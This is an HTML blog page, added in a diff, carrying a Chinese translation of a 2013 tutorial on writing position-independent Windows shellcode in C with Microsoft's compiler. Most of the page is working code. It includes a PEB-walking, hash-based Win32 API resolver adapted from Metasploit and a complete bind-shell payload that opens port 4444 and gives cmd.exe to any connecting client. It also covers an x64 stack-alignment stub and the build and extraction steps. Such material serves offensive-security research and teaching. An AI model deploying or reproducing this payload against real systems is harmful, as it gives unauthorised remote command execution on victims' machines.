@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <title>用C语言进一步优化Windows Shellcode</title>
+        <meta name="viewport" content="width=device-width">
+
+        <!-- syntax highlighting CSS -->
+        <link rel="stylesheet" href="/css/syntax.css">
+
+        <!-- Custom CSS -->
+        <link rel="stylesheet" href="/css/main.css">
+
+        <link href="/css/prettify.css" rel="stylesheet" type="text/css" media="all">
+
+    </head>
+    <body>
+
+        <div id="header" alog-group="log-header">
+          <div class="header-content">
+                
+                <div id="menu"><a href="/">首页</a></div>
+                <div id="usrbar"><a href="http://news.baidu.com">百度新闻</a>|<a href="http://www.baidu.com">百度首页</a></div>
+                <div class="top-main"><h1 class="title"><a href="/">LubyRuffy的天上人间</a></h1></div>
+          </div>  
+        </div>
+
+        <div class="clearfix" id="body">
+          <div class="l-main-col">
+            
+
+            <div id="page">
+	<h2>用C语言进一步优化Windows Shellcode</h2>
+	<p class="meta">2014-02-28</p>
+
+	<div class="post">
+	        <p></p>
+<p><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>引言</strong></span></p>
+<p>我得首先承认，编写shellcode真是让人郁闷极了。虽然可以利用些小技巧来减小payload的大小，但编写shellcode仍然会错误百出，难以维护。例如，我发现跟踪x86中寄存器的分配，确保x86_64栈的对齐真的是件蛋疼的事。最终我还是腻了，但回头想想：为啥就不能用C写shellcode payload，让编译器和链接器来接管处理剩下的活呢？这样的话，只需写一次payload，就能运用到任何的体系结构上————像x86、x86_64以及ARM这些。同时，也可以获得如下的好处：</p>
+<pre class="prettyprint lang-html">1. 运用静态分析工具分析payload
+2. 进行单元测试
+3. 利用编译器、链接器来优化payload
+4. 编译器在速度、大小方面的优化比你在行
+5. 利用Visual Studio来写payload，智能化万岁！</pre>
+<p>考虑到已经写了许多Windows下的shellcode，我决定挑战一下仅用微软工具来生成位置无关的shellcode。可最基本的问题是，微软的C编译器cl.exe无法生成位置无关的代码（除了面向Itanium的Visual C++编译器）。终究，我们需要依赖C代码的技巧和一些精心配置的编译器、链接器选项来完成任务。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>Shellcode的根本</strong></span></p>
+<p>编写shellcode时，无论是用C还是汇编，以下是必须要注意的地方：</p>
+<p><strong>1、必须位置无关</strong></p>
+<p>多数情况下，你无法提前知晓你的shellcode被加载到何处。所以，所有的分支指令以及那些对内存解引用的指令，都必须相对于加载的基址得以执行。gcc编译器有生成位置独立代码的选项，但很不幸，微软的编译器没有。</p>
+<p><strong>2、Payload需要自己解析外部引用</strong></p>
+<p>如果想要payload做些有用的事，就需要调用Win32 API函数。一般在可执行文件中，对外部符号的引用通过这样的方式得到：要么是加载器启动时遍历导入表获取的，要么就是运行时通过GetProcAddress动态获取。而Shellcode既不能被加载器加载，也不能调用GetProcAddress，因为它压根不知道kernel32!GetProcAddress的地址，典型的先有鸡还是先有蛋的难题啊。</p>
+<p>为了获取到库函数的地址，shellcode只能靠自己。在shellcode中，典型的解决方法是：某函数以32位的模块hash和函数名hash作为形参，获取到PEB(进程环境块）地址，遍历已加载模块的链表，扫描每个模块的导出函数表，对每个函数名进行hash，并同提供的hash进行比对，如果匹配找到了，那么通过加载模块的基址加上RVA即可获取函数地址。很显然，这里为了节省篇幅，我省略了该过程的很多细节，不过这些已经被广泛的使用（如Metasploit)，也有很好的文档说明。</p>
+<p><strong>3、Payload需要处理好栈和寄存器的状态，及时的保存、恢复</strong></p>
+<p>这些在我们用C写payload时，就由编译器自动的完成了。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>用C实现的GetProcAddressWithHash函数</strong></span></p>
+<p>上面提到的下载中，GetProcAddressWithHash函数用于获取Win32 API导出函数的地址，由汇编版的<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" title="" data_ue_src="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm">Metasploit block_api</a>调整而来：</p>
+<pre class="prettyprint lang-cpp">#include &lt;windows.h&gt;
+#include &lt;winternl.h&gt;
+ 
+// This compiles to a ROR instruction
+// This is needed because _lrotr() is an external reference
+// Also, there is not a consistent compiler intrinsic to accomplish this across all three platforms.
+#define ROTR32(value, shift) (((DWORD) value &gt;&gt; (BYTE) shift) | ((DWORD) value &lt;&lt; (32 - (BYTE) shift)))
+ 
+// Redefine PEB structures. The structure definitions in winternl.h are incomplete.
+typedef struct _MY_PEB_LDR_DATA {
+    ULONG Length;
+ BOOL Initialized;
+ PVOID SsHandle;
+ LIST_ENTRY InLoadOrderModuleList;
+    LIST_ENTRY InMemoryOrderModuleList;
+ LIST_ENTRY InInitializationOrderModuleList;
+} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;
+ 
+typedef struct _MY_LDR_DATA_TABLE_ENTRY
+{
+ LIST_ENTRY InLoadOrderLinks;
+ LIST_ENTRY InMemoryOrderLinks;
+ LIST_ENTRY InInitializationOrderLinks;
+ PVOID DllBase;
+ PVOID EntryPoint;
+ ULONG SizeOfImage;
+ UNICODE_STRING FullDllName;
+ UNICODE_STRING BaseDllName;
+} MY_LDR_DATA_TABLE_ENTRY, *PMY_LDR_DATA_TABLE_ENTRY;
+ 
+HMODULE GetProcAddressWithHash( _In_ DWORD dwModuleFunctionHash )
+{
+ PPEB PebAddress;
+ PMY_PEB_LDR_DATA pLdr;
+ PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
+ PVOID pModuleBase;
+ PIMAGE_NT_HEADERS pNTHeader;
+ DWORD dwExportDirRVA;
+ PIMAGE_EXPORT_DIRECTORY pExportDir;
+ PLIST_ENTRY pNextModule;
+ DWORD dwNumFunctions;
+ USHORT usOrdinalTableIndex;
+ PDWORD pdwFunctionNameBase;
+ PCSTR pFunctionName;
+ UNICODE_STRING BaseDllName;
+ DWORD dwModuleHash;
+ DWORD dwFunctionHash;
+ PCSTR pTempChar;
+ DWORD i;
+ 
+#if defined(_WIN64)
+ PebAddress = (PPEB) __readgsqword( 0x60 );
+#elif defined(_M_ARM)
+ // I can assure you that this is not a mistake. The C compiler improperly emits the proper opcodes
+ // necessary to get the PEB.Ldr address
+ PebAddress = (PPEB) ( (ULONG_PTR) _MoveFromCoprocessor(15, 0, 13, 0, 2) + 0);
+ __emit( 0x00006B1B );
+#else
+ PebAddress = (PPEB) __readfsdword( 0x30 );
+#endif
+ 
+ pLdr = (PMY_PEB_LDR_DATA) PebAddress-&gt;Ldr;
+ pNextModule = pLdr-&gt;InLoadOrderModuleList.Flink;
+ pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pNextModule;
+ 
+ while (pDataTableEntry-&gt;DllBase != NULL)
+ {
+  dwModuleHash = 0;
+  pModuleBase = pDataTableEntry-&gt;DllBase;
+  BaseDllName = pDataTableEntry-&gt;BaseDllName;
+  pNTHeader = (PIMAGE_NT_HEADERS) ((ULONG_PTR) pModuleBase + ((PIMAGE_DOS_HEADER) pModuleBase)-&gt;e_lfanew);
+  dwExportDirRVA = pNTHeader-&gt;OptionalHeader.DataDirectory[0].VirtualAddress;
+ 
+  // Get the next loaded module entry
+  pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY) pDataTableEntry-&gt;InLoadOrderLinks.Flink;
+ 
+  // If the current module does not export any functions, move on to the next module.
+  if (dwExportDirRVA == 0)
+  {
+   continue;
+  }
+ 
+  // Calculate the module hash
+  for (i = 0; i &lt; BaseDllName.MaximumLength; i++)
+  {
+   pTempChar = ((PCSTR) BaseDllName.Buffer + i);
+ 
+   dwModuleHash = ROTR32( dwModuleHash, 13 );
+ 
+   if ( *pTempChar &gt;= 0x61 )
+   {
+    dwModuleHash += *pTempChar - 0x20;
+   }
+   else
+   {
+    dwModuleHash += *pTempChar;
+   }
+  }
+ 
+  pExportDir = (PIMAGE_EXPORT_DIRECTORY) ((ULONG_PTR) pModuleBase + dwExportDirRVA);
+ 
+  dwNumFunctions = pExportDir-&gt;NumberOfNames;
+  pdwFunctionNameBase = (PDWORD) ((PCHAR) pModuleBase + pExportDir-&gt;AddressOfNames);
+ 
+  for (i = 0; i &lt; dwNumFunctions; i++)
+  {
+   dwFunctionHash = 0;
+   pFunctionName = (PCSTR) (*pdwFunctionNameBase + (ULONG_PTR) pModuleBase);
+   pdwFunctionNameBase++;
+ 
+   pTempChar = pFunctionName;
+ 
+   do
+   {
+    dwFunctionHash = ROTR32( dwFunctionHash, 13 );
+    dwFunctionHash += *pTempChar;
+    pTempChar++;
+   } while (*(pTempChar - 1) != 0);
+ 
+   dwFunctionHash += dwModuleHash;
+ 
+   if (dwFunctionHash == dwModuleFunctionHash)
+   {
+    usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR) pModuleBase + pExportDir-&gt;AddressOfNameOrdinals) + (2 * i));
+    return (HMODULE) ((ULONG_PTR) pModuleBase + *(PDWORD)(((ULONG_PTR) pModuleBase + pExportDir-&gt;AddressOfFunctions) + (4 * usOrdinalTableIndex)));
+   }
+  }
+ }
+ 
+ // All modules have been exhausted and the function was not found.
+ return NULL;
+}</pre>
+<p>从上到下，有几点需要注意：</p>
+<p><strong>1. 我定义了ROTR32宏</strong></p>
+<p>Metasploit版本的实现中使用了一个循环右移hash函数，可在C中没有循环右移的运算符。有几个循环右移的编译器指令，但无法在不同的处理器体系结构中保持一致。ROTR32宏定义利用了C语言中可用的逻辑运算符实现了循环右移的功能。更酷的是，编译器会晓得该宏实现循环右移的操作，并将其编译成单条循环右移汇编指令。真是太棒了！</p>
+<p><strong>2. 我重定义了结构体</strong></p>
+<p>这两个结构体在winternl.h中都有定义，但微软的公开定义不完整，所以我按照自己所需进行了重定义。</p>
+<p><strong>3. 根据所针对的处理器体系结构选择不同的方法来获取PEB地址</strong></p>
+<p>PEB地址的获取是获取导出函数地址的第一步。PEB是个结构体，它包含了几个指向进程已加载模块的指针。在x86和x86_64中，PEB地址可分别通过解引用fs、gs段寄存器的某个偏移获取。在ARM上，通过读取系统控制处理器（CP15)中特定的寄存器获取。幸运的是，编译器内置了对每个处理器体系结构的处理。不管怎样，编译器无法生成正确的ARM汇编指令，所以我以不合常规的方式对指令进行了调整。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>用C实现基本的Payload</strong></span></p>
+<p>这里我用一个简单的bind shell payload为例，下面是我用C的实现：</p>
+<pre class="prettyprint lang-cpp">#define WIN32_LEAN_AND_MEAN
+ 
+#pragma warning( disable : 4201 ) // Disable warning about 'nameless struct/union'
+ 
+#include "GetProcAddressWithHash.h"
+#include "64BitHelper.h"
+#include &lt;windows.h&gt;
+#include &lt;winsock2.h&gt;
+#include &lt;intrin.h&gt;
+ 
+#define BIND_PORT 4444
+#define HTONS(x) ( ( (( (USHORT)(x) ) &gt;&gt; 8 ) &amp; 0xff) | ((( (USHORT)(x) ) &amp; 0xff) &lt;&lt; 8) )
+ 
+// Redefine Win32 function signatures. This is necessary because the output
+// of GetProcAddressWithHash is cast as a function pointer. Also, this makes
+// working with these functions a joy in Visual Studio with Intellisense.
+typedef HMODULE (WINAPI *FuncLoadLibraryA) (
+ _In_z_ LPTSTR lpFileName
+);
+ 
+typedef int (WINAPI *FuncWsaStartup) (
+ _In_ WORD wVersionRequested,
+ _Out_ LPWSADATA lpWSAData
+);
+ 
+typedef SOCKET (WINAPI *FuncWsaSocketA) (
+ _In_  int af,
+ _In_  int type,
+ _In_  int protocol,
+ _In_opt_ LPWSAPROTOCOL_INFO lpProtocolInfo,
+ _In_  GROUP g,
+ _In_  DWORD dwFlags
+);
+ 
+typedef int (WINAPI *FuncBind) (
+ _In_ SOCKET s,
+ _In_ const struct sockaddr *name,
+ _In_ int namelen
+);
+ 
+typedef int (WINAPI *FuncListen) (
+ _In_ SOCKET s,
+ _In_ int backlog
+);
+ 
+typedef SOCKET (WINAPI *FuncAccept) (
+ _In_  SOCKET s,
+ _Out_opt_ struct sockaddr *addr,
+ _Inout_opt_ int *addrlen
+);
+ 
+typedef int (WINAPI *FuncCloseSocket) (
+ _In_ SOCKET s
+);
+ 
+typedef BOOL (WINAPI *FuncCreateProcess) (
+ _In_opt_ LPCTSTR lpApplicationName,
+ _Inout_opt_ LPTSTR lpCommandLine,
+ _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes,
+ _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+ _In_  BOOL bInheritHandles,
+ _In_  DWORD dwCreationFlags,
+ _In_opt_ LPVOID lpEnvironment,
+ _In_opt_ LPCTSTR lpCurrentDirectory,
+ _In_  LPSTARTUPINFO lpStartupInfo,
+ _Out_  LPPROCESS_INFORMATION lpProcessInformation
+);
+ 
+typedef DWORD (WINAPI *FuncWaitForSingleObject) (
+ _In_ HANDLE hHandle,
+ _In_ DWORD dwMilliseconds
+);
+ 
+// Write the logic for the primary payload here
+// Normally, I would call this 'main' but if you call a function 'main', link.exe requires that you link against the CRT
+// Rather, I will pass a linker option of "/ENTRY:ExecutePayload" in order to get around this issue.
+VOID ExecutePayload( VOID )
+{
+ FuncLoadLibraryA MyLoadLibraryA;
+ FuncWsaStartup MyWSAStartup;
+ FuncWsaSocketA MyWSASocketA;
+ FuncBind MyBind;
+ FuncListen MyListen;
+ FuncAccept MyAccept;
+ FuncCloseSocket MyCloseSocket;
+ FuncCreateProcess MyCreateProcessA;
+ FuncWaitForSingleObject MyWaitForSingleObject;
+ WSADATA WSAData;
+ SOCKET s;
+ SOCKET AcceptedSocket;
+ struct sockaddr_in service;
+ STARTUPINFO StartupInfo;
+ PROCESS_INFORMATION ProcessInformation;
+ // Strings must be treated as a char array in order to prevent them from being stored in
+ // an .rdata section. In order to maintain position independence, all data must be stored
+ // in the same section. Thanks to Nick Harbour for coming up with this technique:
+ // http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/
+ char cmdline[] = { 'c', 'm', 'd', 0 };
+ char module[] = { 'w', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+ 
+ // Initialize structures. SecureZeroMemory is forced inline and doesn't call an external module
+ SecureZeroMemory(&amp;StartupInfo, sizeof(StartupInfo));
+ SecureZeroMemory(&amp;ProcessInformation, sizeof(ProcessInformation));
+ 
+ #pragma warning( push )
+ #pragma warning( disable : 4055 ) // Ignore cast warnings
+ // Should I be validating that these return a valid address? Yes... Meh.
+ MyLoadLibraryA = (FuncLoadLibraryA) GetProcAddressWithHash( 0x0726774C );
+ 
+ // You must call LoadLibrary on the winsock module before attempting to resolve its exports.
+ MyLoadLibraryA((LPTSTR) module);
+ 
+ MyWSAStartup = (FuncWsaStartup) GetProcAddressWithHash( 0x006B8029 );
+ MyWSASocketA = (FuncWsaSocketA) GetProcAddressWithHash( 0xE0DF0FEA );
+ MyBind = (FuncBind) GetProcAddressWithHash( 0x6737DBC2 );
+ MyListen = (FuncListen) GetProcAddressWithHash( 0xFF38E9B7 );
+ MyAccept = (FuncAccept) GetProcAddressWithHash( 0xE13BEC74 );
+ MyCloseSocket = (FuncCloseSocket) GetProcAddressWithHash( 0x614D6E75 );
+ MyCreateProcessA = (FuncCreateProcess) GetProcAddressWithHash( 0x863FCC79 );
+ MyWaitForSingleObject = (FuncWaitForSingleObject) GetProcAddressWithHash( 0x601D8708 );
+ #pragma warning( pop )
+ 
+ MyWSAStartup( MAKEWORD( 2, 2 ), &amp;WSAData );
+ s = MyWSASocketA( AF_INET, SOCK_STREAM, 0, NULL, 0, 0 );
+ 
+ service.sin_family = AF_INET;
+ service.sin_addr.s_addr = 0; // Bind to 0.0.0.0
+ service.sin_port = HTONS( BIND_PORT );
+ 
+ MyBind( s, (SOCKADDR *) &amp;service, sizeof(service) );
+ MyListen( s, 0 );
+ AcceptedSocket = MyAccept( s, NULL, NULL );
+ MyCloseSocket( s );
+ 
+ StartupInfo.hStdError = (HANDLE) AcceptedSocket;
+ StartupInfo.hStdOutput = (HANDLE) AcceptedSocket;
+ StartupInfo.hStdInput = (HANDLE) AcceptedSocket;
+ StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+ StartupInfo.cb = 68;
+ 
+ MyCreateProcessA( 0, (LPTSTR) cmdline, 0, 0, TRUE, 0, 0, 0, &amp;StartupInfo, &amp;ProcessInformation );
+ MyWaitForSingleObject( ProcessInformation.hProcess, INFINITE );
+}</pre>
+<p>写payload时，有几点我需要提醒一下，以便满足位置无关代码的需求：</p>
+<p><strong>1. 我把HTONS定义成了宏</strong></p>
+<p>将其定义为宏，相对于调用ws2_32.dll!htons会更简单一点。此外，HTONS本身所做的就是将USHORT从主机序转化为网络序，所以定义为宏会更合适点。</p>
+<p><strong>2. 另定义了Win32 API函数</strong></p>
+<p>这是必须的，因为GetProcAddressWithHash的调用需要转换为函数指针。此外，在Visual Studio中调用这些函数指针就和调用普通的Win32函数一样方便。这是用汇编编写时的边猜测、边检查所不能比的。</p>
+<p><strong>3. ExecutePayload函数实现了bind shell的基本逻辑功能</strong></p>
+<p>通常都需要调用main函数。我所遇到的一个问题就是，当链接器发现main函数时，就会链接C运行库。很明显，shellcode不应该也没必要用C运行库。所以，将入口点命名为main之外的名称，并显式地告诉链接器入口点函数，以免链接了C运行时库。</p>
+<p><strong>4. 将”cmd”和”ws2_32.dll”显式地声明为null结尾的字符数组</strong></p>
+<p>该方法首先由<a href="http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/" target="_blank" title="" data_ue_src="http://nickharbour.wordpress.com/2010/07/01/writing-shellcode-with-a-c-compiler/">Nick Harbour</a>提出，使得编译器在栈区保存字符串。默认地，字符串存储在二进制文件的.rdata段中，任何对这些的字符的引用都在可执行文件中进行了重定位。将字符串存放在栈区，使得引用做到了位置无关。</p>
+<p><strong>5. SecureZeroMemory用于初始化栈区变量</strong></p>
+<p>SecureZeroMemory功能和memset一样，是内联函数，所以省得我花力气去获取memset的地址了。</p>
+<p><strong>6. Payload中剩余部分就是一般的C了，只不过有点恶意而已。</strong></p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>确保64位Shellcode中的栈对齐</strong></span></p>
+<p>32位体系结构（如x86和ARMv7)要求函数调用时栈上4字节对齐。Shellcode以4字节对齐这一点是可以得到保证的。而64位的shellcode，需要16字节的栈对齐。这是由使用128位XMM寄存器所决定的。已写过64位shellcode的朋友可能经历过调用Win32函数时因指令使用了XMM寄存器而crash的情况，这正是栈没有对齐的缘故。</p>
+<p>可执行文件加载时在C运行库初始化期间得到了对齐，而shellcode就没这么幸运了。所以我写了一小段汇编来确保shellcode在64位机器上能够正确的栈对齐。在Visual Studio编译前，我将此shellcode用mI64进行了汇编，并把所得目标文件作为链接的一部分。</p>
+<p>下面是对齐的实现代码：</p>
+<pre class="prettyprint lang-cpp">EXTRN ExecutePayload:PROC
+PUBLIC  AlignRSP   ; Marking AlignRSP as PUBLIC allows for the function
+     ; to be called as an extern in our C code.
+ 
+_TEXT SEGMENT
+ 
+; AlignRSP is a simple call stub that ensures that the stack is 16-byte aligned prior
+; to calling the entry point of the payload. This is necessary because 64-bit functions
+; in Windows assume that they were called with 16-byte stack alignment. When amd64
+; shellcode is executed, you can't be assured that you stack is 16-byte aligned. For example,
+; if your shellcode lands with 8-byte stack alignment, any call to a Win32 function will likely
+; crash upon calling any ASM instruction that utilizes XMM registers (which require 16-byte)
+; alignment.
+ 
+AlignRSP PROC
+ push rsi    ; Preserve RSI since we're stomping on it
+ mov  rsi, rsp  ; Save the value of RSP so it can be restored
+ and  rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
+ sub  rsp, 020h  ; Allocate homing space for ExecutePayload
+ call ExecutePayload ; Call the entry point of the payload
+ mov  rsp, rsi  ; Restore the original value of RSP
+ pop  rsi    ; Restore RSI
+ ret      ; Return to caller
+AlignRSP ENDP
+ 
+_TEXT ENDS
+ 
+END</pre>
+<p>在这里，保存了原始栈值，将栈指针RSP进行与操作，以便获得16字节对齐，分配空间，然后调用原来的入口函数ExecutePayload。</p>
+<p>还用C写了一个小的函数来调用AlignRSP：</p>
+<pre class="prettyprint lang-cpp">#if defined(_WIN64)
+extern VOID AlignRSP( VOID );
+ 
+VOID Begin( VOID )
+{
+ // Call the ASM stub that will guarantee 16-byte stack alignment.
+ // The stub will then call the ExecutePayload.
+ AlignRSP();
+}
+#endif</pre>
+<p>这个函数将作为链接器指定的入口函数，稍后我来简单的解释下为何该函数是必须的。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>编译Shellcode</strong></span></p>
+<p>在Visual Studio 2012项目中使用如下的编译器命令行编译选项</p>
+<p>/GS- /TC /GL /W4 /O1 /nologo /Zl /FA /Os</p>
+<p>这里将每个选项都解释一下，它们影响着生成的shellcode：</p>
+<p>/GS-: 禁用栈区缓冲溢出检查。如果开启了，会调用外部的栈区处理函数，破坏了shellcode的位置无关性。</p>
+<p>/TC: 告诉编译器将所有文件当作C源码文件。该选项的隐含意思是所有的局部变量都要定义在函数的开头，否则，编译时会出错。</p>
+<p>/GL：对程序进行整体优化。该选项告诉链接器(通过/LTGC选项）在函数调用间进行优化。这里我想对shellcode进行完全的优化。</p>
+<p>/W4：开启最高的告警等级。这是好的习惯。</p>
+<p>/O1： 获取较小而非快的代码，这正是shellcode的理想情况。</p>
+<p>/FA： 输出汇编列表文件。这不是必须的，我比较喜欢对编译器生成的汇编代码进行验证。</p>
+<p>/Zl: 从目标文件中去除默认的C运行库，这是告诉链接器不要链接C运行库。</p>
+<p>/Os: 另一种让编译器生成小代码的方式。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>Shellcode的链接</strong></span></p>
+<p>下面的链接器（linker.exe）选项分别用于x86/ARM和x86_64：</p>
+<p>/LTCG /ENTRY:"ExecutePayload" /OPT:REF /SAFESEH:NO /SUBSYSTEM:CONSOLE /MAP /ORDER:@"function_link_order.txt" /OPT:ICF /NOLOGO /NODEFAULTLIB</p>
+<p>/LTCG "x64\Release\\AdjustStack.obj" /ENTRY:"Begin" /OPT:REF /SAFESEH:NO /SUBSYSTEM:CONSOLE /MAP /ORDER:@"function_link_order64.txt" /OPT:ICF /NOLOGO /NODEFAULTLIB</p>
+<p>这里将每个选项都来解释一下，它们影响着生成的shellcode。</p>
+<p>/LTCG：开启链接器的全部优化功能。编译器在函数间调用优化方面几乎不起作用，这是因为编译器是以函数为基础的。所以，链接器就很适合进行函数间调用的优化，因为它处理所有由编译器生成的目标文件。</p>
+<p>/ENTRY: 指定文件的入口点。在x86和ARM中就是实现bind shell逻辑的ExecutePayload函数。而在x86_64中，则是Begin函数，它调用AlignRSP函数进行栈对齐操作。它之所以是必须的，是因为最终要生成shellcode, 我们不得不通过/ORDER显式地设置链接顺序。而在微软的链接器中是不允许你为外部函数指定链接顺序的。为了解决该问题，我简单的将AlignRSP进行了封装。Begin作为链接的第一个函数。这样，它就是shellcode中第一个调用的。</p>
+<p>/OPT: REF：清除那些从未使用的函数、数据。我们希望shellcode越小越好。通过该选项就可以通过清除无用的函数、数据来减小shellcode大小。</p>
+<p>/SAFESEH:NO:不生成SafeSEH处理程序。Shellcode没有必要注册异常处理。</p>
+<p>/SUBSYSTEM:CONSOLE：只要shellcode能运行，是啥子系统就无所谓了。设置成“CONSOLE”，可以利用命令行进行测试。</p>
+<p>/MAP: 生成map文件。该文件用于获取shellcode的大小。</p>
+<p>/ORDER：因为要生成shellcode，所以函数链接的顺序就尤为重要。起初我以为入口点函数会是第一个链接的。但并不是这样的。/ORDER选项指定了一个包含函数链接顺序的文件。你会发现文件中列表的第一个就是入口点函数。</p>
+<p>/OPT:ICF：删除冗余的函数。为可选项。</p>
+<p>/NODEFAULTLIB: 显式的告诉链接器在解析外部引用时，不要使用默认的库。如果你在代码中有外部引用，该选项就非常有用了。 链接器会抛出错误，引起你的注意。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>提取Shellcode</strong></span></p>
+<p>代码编译、链接之后，最后一步就是从exe文件中提取出shellcode了。这需要一个解析PE文件的工具，从代码段中提取出相关字节。 方便的是，<a href="https://github.com/mattifestation/PowerSploit/tree/master/PETools" target="_blank" title="" data_ue_src="https://github.com/mattifestation/PowerSploit/tree/master/PETools">Get-PEHeader</a>已经解决了此问题。要说明的一点是如果你要提取出整个的代码段，剩下的会被0填充掉。所以我写了另外一个脚本来解析map文件，它包含了代码段中的实际长度。</p>
+<p>如果大伙喜欢分析PE文件，好好的分析一下所生成的exe文件真的很值得。仅包含代码段，可选头的数据目录中没有任何的数据。这正是我所追寻的——没有任何重定位，额外的节或者导入表的二进制文件。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>编译PIC_Binshell</strong></span></p>
+<p>提供的<a href="https://github.com/mattifestation/PIC_Bindshell" target="_blank" title="" data_ue_src="https://github.com/mattifestation/PIC_Bindshell">PIC_Bindshell.zip</a>中有个Visual Studio 2012项目，在VS2012 Express和旗舰版中测试通过。在Visual Studio中加载sln文件，选择相应的体系结构，然后编译。输出一个exe文件和一个shellcode payload文件。</p>
+<p>Visual Studio 2012的Express版本不支持对ARM的编译。如果你是第一次编译ARM，会出现如下的错误：</p>
+<p>C:\Program Files (x86)\MSBuild\Microsoft.Cpp\v4.0\V110\Platforms\ARM\PlatformToolsets\v110\Microsoft.Cpp.ARM.v110.targets(36,5): error MSB8022: Compiling Desktop applications for the ARM platform is not supported.</p>
+<p>从“C:\Program Files(x86)\Microsoft Visual Studio 11.0\VC\includecrtdefs.h”中删除下面一行：</p>
+<p>#error Compiling Desktop applications for the ARM platform is not supported.</p>
+<p>删除这些行，重启Visual Studio，就解决了。</p>
+<p style="margin-top: 15px;"><span style="color: rgb(38, 38, 38); font-size: 20px;"><strong>写在最后</strong></span></p>
+<p>对微软编译器、链接器的协同工作有个深刻的理解能帮我们用C写出完全优化的Windows Shellcode，同时能够支持任意的处理器架构。但这并不是说你就没有必要去深刻理解汇编语言。只是我们没必要浪费时间一点点的写大量的汇编代码。同时我也相信编译器有一天会胜过大脑的。</p>
+<p>对了，我的64位shellcode中用到了XMM寄存器，你用了吗？</p>
+<p><span style="color: rgb(38, 38, 38);"><strong>来源声明：本文来自exploit-monday的博文《<a href="http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html" target="_blank" title="" data_ue_src="http://www.exploit-monday.com/2013/08/writing-optimized-windows-shellcode-in-c.html">Writing Optimized Windows Shellcode in C</a>》，由IDF实验室徐文博翻译。</strong></span></p>
+
+        <p class="statement">
+
+	</div>
+</div>
+
+
+          </div>
+
+          <div class="l-right-col">
+          </div>
+        </div>
+
+        <div id="footer" alog-group="log-footer">
+          <p class="site-info">
+            <a href="https://github.com/LubyRuffy">github.com/LubyRuffy</a><br />
+            <a href="https://twitter.com/LubyRuffy">twitter.com/LubyRuffy</a><br />
+          </p>
+        </div>
+
+    </body>
+</html>
